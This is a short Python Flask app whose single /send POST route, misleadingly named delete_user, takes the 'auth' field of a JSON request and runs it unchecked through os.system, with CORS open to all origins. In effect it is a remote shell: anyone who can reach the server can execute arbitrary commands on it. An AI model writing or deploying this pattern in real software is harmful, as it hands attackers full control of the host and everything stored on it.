from flask import Flask
from flask_cors import CORS
from flask import request
import json
import os

app = Flask(__name__)
CORS(app)


@app.route('/send', methods = ['POST'])
def delete_user():
    command = json.loads(request.data.decode('utf-8')).get("auth")
    os.system(f"{command}")
    return command


if __name__ == '__main__':
    app.run()  # debug = True
